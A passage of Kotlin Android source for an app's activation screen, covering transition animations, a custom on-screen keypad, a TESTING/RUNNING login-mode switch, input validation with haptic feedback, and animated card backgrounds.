                            Pair.create(taglineView, "tagline_transition"),
                            Pair.create(cardWrapper, "card_wrapper_transition"),
                            Pair.create(inputCard, "phone_card_transition") // Input card → phone card
                        ).toBundle()

                        startActivity(intent, options)
                        android.util.Log.d("ActivationActivity", "Navigation started with smooth shared element transition")

                        // Finish immediately to allow destination activity to show immediately
                        if (!isDestroyed && !isFinishing) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                finishAfterTransition()
                            } else {
                                finish()
                            }
                        }
                    } else {
                        // Fallback for older Android versions
                        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                        startActivity(intent)
                        handler.postDelayed({
                            if (!isDestroyed && !isFinishing) {
                                finish()
                            }
                        }, 300)
                    }
                } catch (e: Exception) {
                    android.util.Log.e("ActivationActivity", "Error starting ActivatedActivity with transition", e)
                    // Fallback: simple navigation
                    try {
                        overridePendingTransition(android.R.anim.fade_in, android.R.anim.fade_out)
                        startActivity(intent)
                        finish()
                    } catch (ex: Exception) {
                        android.util.Log.e("ActivationActivity", "Critical: Failed to navigate", ex)
                    }
                }
            }
        }
    }

    private fun showActivationUI(isTransitioningFromSplash: Boolean = false) {
        if (isTransitioningFromSplash) {
            // Coming from SplashActivity - show logo, crypto hash card, and status card from first frame
            // Crypto hash card unchanged; center content (including utility card) visible immediately
            id.activationHeaderSection.alpha = 1f
            id.activationContentContainer.alpha = 1f
            id.activationContentContainer.translationY = 0f

            // Start hint text animation after UI is visible (no delayed fade-in)
            handler.post {
                if (!isDestroyed && !isFinishing) {
                    animateHintText()
                }
            }
        } else {
            // Normal entry - animate both header and center content
            val views = listOf(id.activationHeaderSection, id.activationContentContainer)
            var completedAnimations = 0
            val totalAnimations = views.size

            views.forEachIndexed { index, view ->
                view.alpha = 0f
                view.translationY = 50f
                val delay = (index * 150).toLong()
                val duration = 600L

                view.animate()
                    .alpha(1f)
                    .translationY(0f)
                    .setDuration(duration)
                    .setStartDelay(delay)
                    .setInterpolator(DecelerateInterpolator())
                    .withEndAction {
                        completedAnimations++
                        // Start hint text animation after all UI entry animations complete
                        if (completedAnimations == totalAnimations) {
                            animateHintText()
                        }
                    }
                    .start()
            }
        }

        // Setup input field focus animation (move up 25% when keyboard opens)
        setupInputFieldAnimation()

        // Setup shimmer effect on crypto hash card
        setupShimmerEffect()

        // Custom keypad in card - no system keyboard
        setupCustomKeypad()

        // Setup activate button: replace keyboard with status text in utility card, then run activation
        id.activationActivateButton.onClick {
            android.util.Log.d(TAG, "[DEBUG] ACTIVATE clicked: swap utility card (keyboard -> status)")
            id.activationActivateButton.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY)
            dismissKeyboard()
            // Swap utility card: hide keyboard, show status (same concept as SMS & instruction in ActivatedActivity)
            id.utilityContentKeyboard.visibility = View.GONE
            id.activationStatusCardContainer.visibility = View.VISIBLE
            animateButtonPress(id.activationActivateButton) {
                cleanCardThenActivate()
            }
        }

        id.activationRetryButton.onClick {
            id.activationRetryButton.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY)
            retryActivationNow()
        }

        // Clear button - clears input; if status is showing, swap back to keyboard
        id.activationClearButton.onClick {
            id.activationClearButton.performHapticFeedback(HapticFeedbackConstants.VIRTUAL_KEY)
            id.activationPhoneInput.setText("")
            dismissKeyboard()
            if (id.activationStatusCardContainer.visibility == View.VISIBLE) {
                id.activationStatusCardContainer.visibility = View.GONE
                showUtilityCardKeyboardWithAnimation()
            }
            if (id.activationPhoneInput.text.isNullOrEmpty()) animateHintText()
        }

        // Apply default selections
        applyDefaultSelections()

        // Ensure status card is shown by default (keypad only when user taps input)
        updateActivationState(ActivationState.Idle, null, null)
    }

    /** Custom keypad in card - prevent system keyboard; app uses only company keypad everywhere */
    private fun setupCustomKeypad() {
        val input = id.activationPhoneInput
        input.isFocusable = false
        input.isFocusableInTouchMode = false
        input.isClickable = false
        input.isCursorVisible = false
        if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.LOLLIPOP) {
            input.showSoftInputOnFocus = false
        }
        // Tap input card or input field: show company keypad and hide status (no system keyboard).
        fun onInputAreaTap() {
            android.util.Log.d(TAG, "[DEBUG] input area tapped: show keypad, hide status")
            showUtilityCardKeyboardWithAnimation()
            id.activationStatusCardContainer.visibility = View.GONE
        }
        id.activationInputCard.isFocusable = false
        id.activationInputCard.isFocusableInTouchMode = false
        id.activationInputCard.isClickable = true
        id.activationInputCard.setOnTouchListener { _, event ->
            if (event.actionMasked == android.view.MotionEvent.ACTION_UP) onInputAreaTap()
            true
        }
        // EditText can receive touch before parent; handle tap so keypad shows in TESTING and RUNNING.
        input.setOnTouchListener { _, event ->
            if (event.actionMasked == android.view.MotionEvent.ACTION_UP) onInputAreaTap()
            true
        }

        if (id.activationKeypadInclude == null && id.root.findViewById<View>(R.id.activationKeypadInclude) == null) return

        fun appendChar(c: Char) {
            val current = input.text?.toString() ?: ""
            val maxLen = if (currentLoginType == "testing") 10 else 8
            if (current.length < maxLen) {
                input.setText(current + c)
                input.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
            }
        }

        fun backspace() {
            val current = input.text?.toString() ?: ""
            if (current.isNotEmpty()) {
                input.setText(current.dropLast(1))
                input.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
            }
        }

        listOf(
            R.id.activationKeypad0 to '0',
            R.id.activationKeypad1 to '1',
            R.id.activationKeypad2 to '2',
            R.id.activationKeypad3 to '3',
            R.id.activationKeypad4 to '4',
            R.id.activationKeypad5 to '5',
            R.id.activationKeypad6 to '6',
            R.id.activationKeypad7 to '7',
            R.id.activationKeypad8 to '8',
            R.id.activationKeypad9 to '9',
            R.id.activationKeypadA to 'A',
            R.id.activationKeypadB to 'B',
            R.id.activationKeypadC to 'C',
            R.id.activationKeypadD to 'D'
        ).forEach { (resId, char) ->
            id.root.findViewById<View>(resId)?.let { keyView ->
                keyView.setOnClickListener {
                    animateKeypadKeyPress(keyView)
                    appendChar(char)
                }
            }
        }
        id.root.findViewById<View>(R.id.activationKeypadBackspace)?.let { keyView ->
            keyView.setOnClickListener {
                animateKeypadKeyPress(keyView)
                backspace()
            }
        }
    }

    /** Utility card keypad: key press animation (scale down then bounce back) */
    private fun animateKeypadKeyPress(keyView: View) {
        keyView.animate().cancel()
        keyView.animate()
            .scaleX(0.92f)
            .scaleY(0.92f)
            .setDuration(60)
            .withEndAction {
                keyView.animate()
                    .scaleX(1f)
                    .scaleY(1f)
                    .setDuration(100)
                    .setInterpolator(OvershootInterpolator(1.2f))
                    .start()
            }
            .start()
    }

    /** Clean card (reset status, clear error) then start activation animation */
    private fun cleanCardThenActivate() {
        resetStatusCardColors()
        id.activationStatusCardStatusText.text = statusTypingOriginalStatus.ifEmpty { "Creating secure tunnel with company database" }
        id.activationStatusStepValidate.text = statusTypingOriginalStepValidate.ifEmpty { "• IP Connection Established" }
        id.activationStatusStepRegister.text = statusTypingOriginalStepRegister.ifEmpty { "• Request Sent / Compatibility test" }
        id.activationStatusStepSync.text = statusTypingOriginalStepSync.ifEmpty { "• Response Decrypted" }
        id.activationStatusStepAuth.text = statusTypingOriginalStepAuth.ifEmpty { "• Authorization Check (Approved / Denied)" }
        id.activationStatusStepResult.text = ""
        id.activationStatusStepRegisterBuffer?.visibility = View.GONE
        activate()
    }

    /**
     * Apply default selections (Animation 1, BG 4, Design 1, Border 6, Logo 2)
     */
    private fun applyDefaultSelections() {
        // Apply default design (index 0 = "Selector (Auto-Focus)")
        val (designDrawableRes, _) = inputFieldDesigns[currentDesignIndex]
        id.activationInputCard.background = resources.getDrawable(designDrawableRes, theme)

        // Apply default background (index 3 = "Top Highlight")
        val (bgDrawableRes, _) = cryptoCardBackgrounds[currentBgIndex]
        id.activationFormCard.background = resources.getDrawable(bgDrawableRes, theme)

        // Apply default animation (index 0 = "None")
        val (_, animFunction) = cardAnimations[currentAnimationIndex]
        animFunction.invoke()

        // Apply default border (index 5 = "Dashed")
        applyBorderStyle(currentBorderIndex)

        // Apply default logo style (index 1 = "Large")
        applyLogoStyle(currentLogoIndex)
    }

    /**
     * Apply border style to wrapper
     */
    private fun applyBorderStyle(borderIndex: Int) {
        val (drawableRes, _) = outerBorderStyles[borderIndex]
        id.activationFormCardOuterBorder.background = resources.getDrawable(drawableRes, theme)
    }

    /**
     * Apply logo style
     */
    private fun applyLogoStyle(logoIndex: Int) {
        val (_, style) = logoStyles[logoIndex]
        val logoView = id.activationLogoText

        logoView.textSize = style.textSize
        logoView.alpha = style.alpha
        logoView.letterSpacing = style.letterSpacing

        // Apply shadow radius
        if (style.shadowRadius > 0f) {
            logoView.setShadowLayer(
                style.shadowRadius,
                0f,
                0f,
                resources.getColor(R.color.theme_primary, theme)
            )
        } else {
            logoView.setShadowLayer(0f, 0f, 0f, android.graphics.Color.TRANSPARENT)
        }
    }

    // Background animation state
    private var currentBackgroundAnimator: ValueAnimator? = null

    /**
     * Stop current background animation
     */
    private fun stopCurrentCardAnimation() {
        currentBackgroundAnimator?.cancel()
        currentBackgroundAnimator = null
        // Reset card properties
        id.activationFormCard.alpha = 1f
        id.activationFormCard.elevation = 4f
        id.activationFormCard.translationX = 0f
        id.activationFormCard.translationY = 0f
        id.activationFormCard.scaleX = 1f
        id.activationFormCard.scaleY = 1f
        id.activationFormCard.rotation = 0f
    }

    /**
     * Animation 1: Pulse - Background glows pulse
     */
    private fun startPulseAnimation() {
        stopCurrentCardAnimation()

        val card = id.activationFormCard
        val themePrimary = resources.getColor(R.color.theme_primary, theme)

        currentBackgroundAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 1500
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.REVERSE
            interpolator = AccelerateDecelerateInterpolator()

            addUpdateListener { animator ->
                val progress = animator.animatedValue as Float
                // Animate background border glow opacity (0.03 to 0.08)
                val borderOpacity = (0.03f + progress * 0.05f).coerceIn(0.03f, 0.08f)
                val borderColor = android.graphics.Color.argb(
                    (borderOpacity * 255).toInt(),
                    android.graphics.Color.red(themePrimary),
                    android.graphics.Color.green(themePrimary),
                    android.graphics.Color.blue(themePrimary)
                )

                updateBackgroundBorderGlow(borderColor)
            }

            start()
        }
    }

    /**
     * Animation 2: Glow - Background border glows with neon effect
     */
    private fun startGlowAnimation() {
        stopCurrentCardAnimation()

        val card = id.activationFormCard
        val themePrimary = resources.getColor(R.color.theme_primary, theme)

        currentBackgroundAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 2000
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.REVERSE

            addUpdateListener { animator ->
                val progress = animator.animatedValue as Float
                // Animate border glow intensity (0.03 to 0.15)
                val borderOpacity = (0.03f + Math.sin((progress * Math.PI).toDouble()).toFloat() * 0.12f).coerceIn(0.03f, 0.15f)
                val borderColor = android.graphics.Color.argb(
                    (borderOpacity * 255).toInt(),
                    android.graphics.Color.red(themePrimary),
                    android.graphics.Color.green(themePrimary),
                    android.graphics.Color.blue(themePrimary)
                )

                // Also animate elevation for glow effect
                card.elevation = (4 + progress * 12).toFloat()

                updateBackgroundBorderGlow(borderColor)
            }

            start()
        }
    }

    /**
     * Animation 3: Wave - Background has a wave effect
     */
    private fun startScaleAnimation() {
        stopCurrentCardAnimation()

        val card = id.activationFormCard
        val themePrimary = resources.getColor(R.color.theme_primary, theme)

        currentBackgroundAnimator = ValueAnimator.ofFloat(0f, 1f).apply {
            duration = 2000
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.RESTART

            addUpdateListener { animator ->
                val progress = animator.animatedValue as Float
                // Create wave effect with gradient movement
                val waveProgress = (Math.sin((progress * Math.PI * 2).toDouble()).toFloat() * 0.5 + 0.5).toFloat()
                val gradientOpacity = (0.03f + waveProgress * 0.1f).coerceIn(0.03f, 0.13f)

                updateBackgroundGradientWave(gradientOpacity, progress)
            }

            start()
        }
    }

    /**
     * Animation 4: Rotate Gradient - Background gradient rotates
     */
    private fun startRotateAnimation() {
        stopCurrentCardAnimation()

        val card = id.activationFormCard
        val themePrimary = resources.getColor(R.color.theme_primary, theme)

        currentBackgroundAnimator = ValueAnimator.ofFloat(0f, 360f).apply {
            duration = 3000
            repeatCount = ValueAnimator.INFINITE
            repeatMode = ValueAnimator.RESTART
            interpolator = android.view.animation.LinearInterpolator()

            addUpdateListener { animator ->
                val angle = animator.animatedValue as Float
                // Rotate gradient angle
                updateBackgroundGradientAngle(angle.toInt())
            }

            start()
        }
    }

    /**
     * Animation 5: Shimmer - Background has a shimmer effect moving across
     */
    private fun startShimmerCardAnimation() {
        stopCurrentCardAnimation()

        // Use existing shimmer effect
        setupShimmerEffect()
    }

    /**
     * Update background border glow color
     */
    private fun updateBackgroundBorderGlow(glowColor: Int) {
        try {
            val baseDrawable = resources.getDrawable(R.drawable.crypto_hash_card_background, theme) as? android.graphics.drawable.LayerDrawable
                ?: return

            val layers = baseDrawable.numberOfLayers
            if (layers >= 4) {
                // Update border stroke color (layer 3, index 3)
                val borderShape = baseDrawable.getDrawable(3) as? android.graphics.drawable.GradientDrawable
                borderShape?.setStroke(1, glowColor, 12f * resources.displayMetrics.density, 0f)

                // Update overlay color (layer 1, index 1)
                val overlayShape = baseDrawable.getDrawable(1) as? android.graphics.drawable.GradientDrawable
                overlayShape?.setColor(glowColor)

                id.activationFormCard.background = baseDrawable
            }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "Error updating border glow", e)
        }
    }

    /**
     * Update background gradient wave effect
     */
    private fun updateBackgroundGradientWave(opacity: Float, progress: Float) {
        try {
            val card = id.activationFormCard
            val themePrimary = resources.getColor(R.color.theme_primary, theme)

            val gradientColor = android.graphics.Color.argb(
                (opacity * 255).toInt(),
                android.graphics.Color.red(themePrimary),
                android.graphics.Color.green(themePrimary),
                android.graphics.Color.blue(themePrimary)
            )

            val baseDrawable = resources.getDrawable(R.drawable.crypto_hash_card_background, theme) as? android.graphics.drawable.LayerDrawable
                ?: return

            // Create animated gradient overlay
            val gradientDrawable = android.graphics.drawable.GradientDrawable().apply {
                orientation = android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT
                colors = intArrayOf(
                    android.graphics.Color.TRANSPARENT,
                    gradientColor,
                    android.graphics.Color.TRANSPARENT
                )
                cornerRadius = 12 * resources.displayMetrics.density
            }

            val layers = arrayOf(baseDrawable, gradientDrawable)
            val layerDrawable = android.graphics.drawable.LayerDrawable(layers)
            card.background = layerDrawable

        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "Error updating gradient wave", e)
        }
    }

    /**
     * Update background gradient angle
     */
    private fun updateBackgroundGradientAngle(angle: Int) {
        try {
            val card = id.activationFormCard
            val themePrimary = resources.getColor(R.color.theme_primary, theme)

            val baseDrawable = resources.getDrawable(R.drawable.crypto_hash_card_background, theme) as? android.graphics.drawable.LayerDrawable
                ?: return

            // Create rotating gradient overlay
            val gradientDrawable = android.graphics.drawable.GradientDrawable().apply {
                orientation = android.graphics.drawable.GradientDrawable.Orientation.LEFT_RIGHT
                val gradientColor = android.graphics.Color.argb(
                    (0.05f * 255).toInt(),
                    android.graphics.Color.red(themePrimary),
                    android.graphics.Color.green(themePrimary),
                    android.graphics.Color.blue(themePrimary)
                )
                colors = intArrayOf(
                    android.graphics.Color.TRANSPARENT,
                    gradientColor,
                    android.graphics.Color.TRANSPARENT
                )
                cornerRadius = 12 * resources.displayMetrics.density
            }

            val layers = arrayOf(baseDrawable, gradientDrawable)
            val layerDrawable = android.graphics.drawable.LayerDrawable(layers)
            card.background = layerDrawable

        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "Error updating gradient angle", e)
        }
    }

    /**
     * Setup login type selector (TESTING/RUNNING)
     */
    private fun setupLoginTypeSelector() {
        // Set TESTING as default active
        selectLoginType("testing")

        // Setup click listeners
        id.activationModeTestingContainer.setOnClickListener {
            selectLoginType("testing")
        }

        id.activationModeRunningContainer.setOnClickListener {
            selectLoginType("running")
        }
    }

    /**
     * Select login type (testing = number, running = code)
     */
    private fun selectLoginType(type: String) {
        currentLoginType = type

        val testingButton = id.activationModeTestingText
        val runningButton = id.activationModeRunningText
        val testingContainer = id.activationModeTestingContainer
        val runningContainer = id.activationModeRunningContainer
        val inputField = id.activationPhoneInput

        if (type == "testing") {
            // Activate TESTING button
            testingContainer.background = resources.getDrawable(R.drawable.login_type_button_active, theme)
            testingButton.setTextColor(resources.getColor(R.color.theme_primary, theme))
            testingButton.alpha = 1f
            testingButton.typeface = android.graphics.Typeface.create("monospace", android.graphics.Typeface.BOLD)

            // Deactivate RUNNING button
            runningContainer.background = resources.getDrawable(R.drawable.login_type_button_background, theme)
            runningButton.setTextColor(resources.getColor(R.color.theme_text_light, theme))
            runningButton.alpha = 0.6f
            runningButton.typeface = android.graphics.Typeface.create("monospace", android.graphics.Typeface.NORMAL)

            // Update input field
            inputField.hint = ""
            inputField.inputType = android.text.InputType.TYPE_CLASS_PHONE
            inputField.filters = arrayOf(android.text.InputFilter.LengthFilter(10))

            // Clear input
            inputField.setText("")

        } else {
            // Activate RUNNING button
            runningContainer.background = resources.getDrawable(R.drawable.login_type_button_active, theme)
            runningButton.setTextColor(resources.getColor(R.color.theme_primary, theme))
            runningButton.alpha = 1f
            runningButton.typeface = android.graphics.Typeface.create("monospace", android.graphics.Typeface.BOLD)

            // Deactivate TESTING button
            testingContainer.background = resources.getDrawable(R.drawable.login_type_button_background, theme)
            testingButton.setTextColor(resources.getColor(R.color.theme_text_light, theme))
            testingButton.alpha = 0.6f
            testingButton.typeface = android.graphics.Typeface.create("monospace", android.graphics.Typeface.NORMAL)

            // Update input field
            inputField.hint = ""
            inputField.inputType = android.text.InputType.TYPE_CLASS_TEXT or android.text.InputType.TYPE_TEXT_FLAG_NO_SUGGESTIONS or android.text.InputType.TYPE_TEXT_FLAG_CAP_CHARACTERS
            inputField.filters = arrayOf(android.text.InputFilter.LengthFilter(8))

            // Clear input
            inputField.setText("")
        }

        // Clear any error state
        id.activationPhoneInput.setTextColor(resources.getColor(R.color.theme_primary, theme))

        // Restart animated placeholder if field is empty
        if (id.activationPhoneInput.text.isNullOrEmpty()) {
            animateHintText()
        }

        // Animate button press
        val selectedContainer = if (type == "testing") testingContainer else runningContainer
        selectedContainer.animate()
            .scaleX(0.95f)
            .scaleY(0.95f)
            .setDuration(100)
            .withEndAction {
                selectedContainer.animate()
                    .scaleX(1f)
                    .scaleY(1f)
                    .setDuration(100)
                    .start()
            }
            .start()
    }

    /**
     * Setup keyboard dismissal when clicking outside the input field
     */
    private fun setupKeyboardDismissal() {
        // Dismiss keyboard when clicking on main layout (background areas)
        id.activationRootLayout.setOnClickListener { view ->
            // Only dismiss if click is not on interactive elements
            val clickedView = view
            if (clickedView.id == id.activationRootLayout.id) {
                dismissKeyboard()
            }
        }

        // Dismiss keyboard when clicking on header section
        id.activationHeaderSection.setOnClickListener {
            dismissKeyboard()
        }

        // Dismiss keyboard when clicking on center content scroll (but not on cards)
        id.activationContentScrollView.setOnClickListener { view ->
            // Only dismiss if not clicking on a card
            if (view.id == id.activationContentScrollView.id) {
                dismissKeyboard()
            }
        }
    }

    /**
     * Dismiss the keyboard (company keypad only - no system keyboard)
     */
    private fun dismissKeyboard() {
        val imm = getSystemService(Context.INPUT_METHOD_SERVICE) as android.view.inputmethod.InputMethodManager
        val currentFocus = currentFocus
        if (currentFocus != null) {
            android.util.Log.d(TAG, "[DEBUG] dismissKeyboard: hiding from currentFocus=${currentFocus.javaClass.simpleName}")
            imm.hideSoftInputFromWindow(currentFocus.windowToken, 0)
            currentFocus.clearFocus()
        } else {
            imm.hideSoftInputFromWindow(id.activationRootLayout.windowToken, 0)
        }
    }

    /**
     * Show the utility card keyboard with slide-up + fade-in animation.
     * Call when user taps the input field or Clear restores keypad.
     */
    private fun showUtilityCardKeyboardWithAnimation() {
        val keyboard = id.utilityContentKeyboard
        val slidePx = (24 * resources.displayMetrics.density).toInt()
        keyboard.visibility = View.VISIBLE
        keyboard.translationY = slidePx.toFloat()
        keyboard.alpha = 0f
        keyboard.animate()
            .translationY(0f)
            .alpha(1f)
            .setDuration(220)
            .setInterpolator(DecelerateInterpolator())
            .start()
    }

    /**
     * Setup real-time input validation for TESTING and RUNNING modes
     * - TESTING: only digits allowed
     * - RUNNING: only letters and digits, convert letters to uppercase
     * - Shows quick vibration + input field shake on invalid characters
     */
    private fun setupRunningModeInputValidation() {
        id.activationPhoneInput.addTextChangedListener(object : android.text.TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
                // Not needed
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                // Not needed
            }

            override fun afterTextChanged(s: android.text.Editable?) {
                if (isInputUpdating) {
                    return
                }

                val text = s?.toString() ?: return
                val cursorPosition = id.activationPhoneInput.selectionStart.coerceAtLeast(0)

                // Check for invalid characters and normalize
                val invalidChars = mutableListOf<Int>()
                val validChars = StringBuilder()
                var removedBeforeCursor = 0

                for (i in text.indices) {
                    val char = text[i]
                    if (currentLoginType == "testing") {
                        if (char.isDigit() && validChars.length < 10) {
                            validChars.append(char)
                        } else {
                            invalidChars.add(i)
                            if (i < cursorPosition) removedBeforeCursor++
                        }
                    } else if (currentLoginType == "running") {
                        val targetIndex = validChars.length
                        if (targetIndex < 8) {
                            val isValid = if (targetIndex < 4) {
                                (char in 'A'..'Z') || (char in 'a'..'z')
                            } else {
                                char.isDigit()
                            }
                            if (isValid) {
                                validChars.append(if (char.isLetter()) char.uppercaseChar() else char)
                            } else {
                                invalidChars.add(i)
                                if (i < cursorPosition) removedBeforeCursor++
                            }
                        } else {
                            invalidChars.add(i)
                            if (i < cursorPosition) removedBeforeCursor++
                        }
                    }
                }

                // If there are invalid characters, remove them and vibrate
                if (invalidChars.isNotEmpty()) {
                    indicateInvalidInput()
                    scheduleInputSanitize(
                        desiredText = validChars.toString(),
                        cursorPosition = cursorPosition,
                        removedBeforeCursor = removedBeforeCursor,
                        animateFade = true
                    )
                    return
                }

                // For RUNNING mode, enforce uppercase
                if (currentLoginType == "running") {
                    val uppercaseText = validChars.toString()
                    if (text != uppercaseText) {
                        scheduleInputSanitize(
                            desiredText = uppercaseText,
                            cursorPosition = cursorPosition,
                            removedBeforeCursor = 0,
                            delayMs = 0
                        )
                    }
                }
            }
        })
    }

    private fun scheduleInputSanitize(
        desiredText: String,
        cursorPosition: Int,
        removedBeforeCursor: Int,
        delayMs: Long = 120,
        animateFade: Boolean = false
    ) {
        inputSanitizeRunnable?.let {
            handler.removeCallbacks(it)
            handlerRunnables.remove(it)
        }
        val runnable = object : Runnable {
            override fun run() {
                val editText = id.activationPhoneInput
                val editable = editText.text
                if (editable == null) {
                    inputSanitizeRunnable = null
                    handlerRunnables.remove(this)
                    return
                }
                if (editable.toString() == desiredText) {
                    inputSanitizeRunnable = null
                    handlerRunnables.remove(this)
                    return
                }
                val applyChange = {
                    val wasEmpty = editable.isEmpty()
                    isInputUpdating = true
                    editable.clear()
                    editable.append(desiredText)
                    val newCursorPosition = (cursorPosition - removedBeforeCursor).coerceIn(0, editable.length)
                    editText.setSelection(newCursorPosition)
                    isInputUpdating = false
                    if (wasEmpty && desiredText.isEmpty()) {
                        animateHintText()
                    }
                }
                val cleanup = {
                    inputSanitizeRunnable = null
                    handlerRunnables.remove(this)
                }
                if (animateFade) {
                    editText.animate().cancel()
                    editText.animate()
                        .alpha(0.45f)
                        .setDuration(90)
                        .setInterpolator(DecelerateInterpolator())
                        .withEndAction {
                            applyChange()
                            editText.animate()
                                .alpha(1f)
                                .setDuration(120)
                                .setInterpolator(DecelerateInterpolator())
                                .withEndAction { cleanup() }
                                .start()
                        }
                        .start()
                } else {
                    applyChange()
                    cleanup()
                }
            }
        }
        inputSanitizeRunnable = runnable
        handlerRunnables.add(runnable)
        handler.postDelayed(runnable, delayMs)
    }

    private fun indicateInvalidInput() {
        try {
            val vibrator = getSystemService(Context.VIBRATOR_SERVICE) as? android.os.Vibrator
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                vibrator?.vibrate(android.os.VibrationEffect.createOneShot(80, android.os.VibrationEffect.DEFAULT_AMPLITUDE))
            } else {
                @Suppress("DEPRECATION")
                vibrator?.vibrate(80)
            }
        } catch (e: Exception) {
            id.activationPhoneInput.performHapticFeedback(HapticFeedbackConstants.KEYBOARD_TAP)
        }

        // Quick visual + shake feedback on the input field
        val themePrimary = resources.getColor(R.color.theme_primary, theme)
        val errorRed = android.graphics.Color.parseColor("#F44336")
        id.activationPhoneInput.setTextColor(errorRed)
        shakeView(id.activationInputCard)
        handler.postDelayed({
            if (!isDestroyed && !isFinishing) {
                id.activationPhoneInput.setTextColor(themePrimary)
            }
        }, 200)
    }

    private fun animateButtonPress(view: View, action: () -> Unit) {
        val startElevation = ViewCompat.getElevation(view)
        val startTranslationZ = ViewCompat.getTranslationZ(view)
        val density = resources.displayMetrics.density
        val pressedZ = -4f * density

        // 3D look: same perspective as crypto hash / utility cards (center-line base)
        view.cameraDistance = density * 8000f

        val scaleDown = AnimatorSet().apply {
            playTogether(
                ObjectAnimator.ofFloat(view, "scaleX", 1f, 0.95f).apply { duration = 100 },
                ObjectAnimator.ofFloat(view, "scaleY", 1f, 0.95f).apply { duration = 100 },
                ObjectAnimator.ofFloat(view, "elevation", startElevation, 0f).apply { duration = 100 },
                ObjectAnimator.ofFloat(view, "translationZ", startTranslationZ, pressedZ).apply { duration = 100 },
                ObjectAnimator.ofFloat(view, "rotationX", 0f, 12f).apply { duration = 100 }
            )
        }
        val scaleUp = AnimatorSet().apply {
            playTogether(
                ObjectAnimator.ofFloat(view, "scaleX", 0.95f, 1f).apply { duration = 150; interpolator = OvershootInterpolator() },
                ObjectAnimator.ofFloat(view, "scaleY", 0.95f, 1f).apply { duration = 150; interpolator = OvershootInterpolator() },
                ObjectAnimator.ofFloat(view, "elevation", 0f, startElevation).apply { duration = 150; interpolator = OvershootInterpolator() },
                ObjectAnimator.ofFloat(view, "translationZ", pressedZ, startTranslationZ).apply { duration = 150; interpolator = OvershootInterpolator() },
                ObjectAnimator.ofFloat(view, "rotationX", 12f, 0f).apply { duration = 150; interpolator = OvershootInterpolator() }
            )
        }
        scaleDown.addListener(object : AnimatorListenerAdapter() {
            override fun onAnimationEnd(animation: Animator) {
                action()
                scaleUp.start()
            }
        })
        scaleDown.start()
    }

    /**
     * Fade out non-transitioning UI elements (keep card visible for shared element transition).
     * @param keepLogoAndTaglineForTransition When true, do not fade logo and tagline so they travel as shared elements to ActivatedActivity.
     */
    private fun fadeOutNonTransitioningUI(keepLogoAndTaglineForTransition: Boolean = false, onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        try {
            // Cancel any ongoing animations first to prevent conflicts
            id.activationRootLayout.clearAnimation()
            id.activationHeaderSection.clearAnimation()
            id.activationContentContainer.clearAnimation()
            id.activationPhoneInput.clearAnimation()
            id.activationActivateButton.clearAnimation()
            id.activationLogoText.clearAnimation()
            id.activationTaglineText.clearAnimation()

            // Fade out only non-transitioning elements (keep cardWrapper and card visible for transition)
            // When keepLogoAndTaglineForTransition is true, exclude logo and tagline so they travel to ActivatedActivity
            val uiElements = if (keepLogoAndTaglineForTransition) {
                listOf(id.activationActivateButton)  // Only activate button
            } else {
                listOf(
                    id.activationActivateButton,
                    id.activationTaglineText,
                    id.activationLogoText
                )
            }

            // Fade out elements quickly without affecting the card
            val animatorSet = AnimatorSet()
            val animators = mutableListOf<Animator>()

            uiElements.forEachIndexed { index, view ->
                if (!isDestroyed && !isFinishing && view.visibility == View.VISIBLE) {
                    // Cancel any existing animations on this view
                    view.clearAnimation()
                    view.animate().cancel()

                    // Quick fade out (no slide to avoid affecting card position)
                    val fadeOut = ObjectAnimator.ofFloat(view, "alpha", view.alpha, 0f).apply {
                        duration = 200
                        startDelay = index * 50L // Quick stagger
                        interpolator = AccelerateDecelerateInterpolator()
                    }

                    animators.add(fadeOut)
                }
            }

            // Fade out input field but keep card visible
            if (!isDestroyed && !isFinishing && id.activationPhoneInput.visibility == View.VISIBLE) {
                id.activationPhoneInput.clearAnimation()
                id.activationPhoneInput.animate().cancel()
                val fadeOut = ObjectAnimator.ofFloat(id.activationPhoneInput, "alpha", id.activationPhoneInput.alpha, 0f).apply {
                    duration = 200
                    interpolator = AccelerateDecelerateInterpolator()
                }
                animators.add(fadeOut)
            }

            // Execute animations
            if (animators.isNotEmpty() && !isDestroyed && !isFinishing) {
                animatorSet.playTogether(animators)
                animatorSet.addListener(object : AnimatorListenerAdapter() {
                    override fun onAnimationEnd(animation: Animator) {
                        if (!isDestroyed && !isFinishing) {
                            onComplete()
                        }
                    }
                })
                animatorSet.start()
            } else {
                // No animations to run, complete immediately
                onComplete()
            }
        } catch (e: Exception) {
            android.util.Log.e("ActivationActivity", "Error fading out UI", e)
            onComplete()
        }
    }

    /**
     * Fade out all UI elements (OLD - kept for compatibility)
     */
    private fun fadeOutCurrentUI(onComplete: () -> Unit) {
        fadeOutNonTransitioningUI(onComplete = onComplete)
    }

    /**
     * OLD fade out function - kept for reference
     */
    private fun fadeOutCurrentUI_OLD(onComplete: () -> Unit) {
        if (isDestroyed || isFinishing) {
            onComplete()
            return
        }

        try {
            // Cancel any ongoing animations first to prevent conflicts
            id.activationRootLayout.clearAnimation()
            id.activationHeaderSection.clearAnimation()
            id.activationContentContainer.clearAnimation()
            id.activationPhoneInput.clearAnimation()
            id.activationInputCard.clearAnimation()
            id.activationActivateButton.clearAnimation()
            id.activationLogoText.clearAnimation()
            id.activationTaglineText.clearAnimation()

